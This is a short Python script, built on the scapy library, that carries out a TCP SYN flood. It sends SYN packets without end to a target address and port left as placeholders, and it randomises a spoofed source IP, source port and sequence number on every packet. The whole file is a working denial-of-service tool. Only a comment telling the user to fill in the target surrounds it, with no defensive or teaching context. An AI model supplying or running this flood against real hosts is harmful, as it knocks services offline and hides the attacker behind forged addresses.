from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
#change the *'s

ip = IP(dst="*.*.*.*") 
tcp = TCP(dport=**, flags='S')
pkt = ip/tcp

while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source ip
  pkt[TCP].sport = getrandbits(16) # source port
  pkt[TCP].seq = getrandbits(32) # sequence number
  send(pkt, iface = '*', verbose = 0)
